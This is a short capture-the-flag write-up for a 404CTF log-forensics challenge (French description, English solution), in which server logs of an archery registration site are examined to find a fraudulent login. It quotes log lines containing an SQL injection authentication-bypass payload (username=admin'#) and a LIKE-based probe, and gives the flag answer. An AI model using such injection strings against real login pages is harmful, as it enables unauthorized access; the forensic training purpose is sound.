---
layout: Post
type: chall
---
# Le tir aux logs ⚪

<a class="back-link" href="../../">< Go back</a>

## Description

Il semblerait qu'une personne malveillante ait réussi à se connecter sur le site d'inscription d'une compétition de tir à l'arc.
Aidez-nous à investiguer sur cette attaque via le fichier de logs de notre serveur. Quel est l'URL complète qui a permis de se connecter de manière frauduleuse ?

Le flag attendu est l'URL utilisée par l'attaquant pour exploiter une vulnérabilité du site avec succès, entouré du format habituel.
Par exemple, si l'attaquant se rend sur la page <https://example.com?authenticated=1> pour se connecter de manière frauduleuse, le flag sera 404CTF{<https://example.com?authenticated=1}>.
Par ailleurs, toutes les IP utilisées sont fictives et non pertinentes.

all files in [resources/](./resources) were provided.

## Challenge

Successful SQL injection:

```
146.70.147.101 - - [19/Feb/2024:19:28:44 -0500] "GET /index.php?username=admin%27%23&password=test HTTP/1.1" 302 784 "http://www.inscription_tir_arc.com/index.php?username=admin%22+AND+password+LIKE+%27a%25%27%23&password=test" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"
146.70.147.101 - - [19/Feb/2024:19:28:44 -0500] "GET /admin.php HTTP/1.1" 200 318 "http://www.inscription_tir_arc.com/index.php?username=admin%22+AND+password+LIKE+%27a%25%27%23&password=test" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"
```

The user got access to the admin page via the `302` redirection from the SQLi attack.

I first tried the flag with the Referer URL but that doesn't work the correct flag is the GET URI + the base URL.

Flag: `404CTF{http://www.inscription_tir_arc.com/index.php?username=admin%27%23&password=test}`
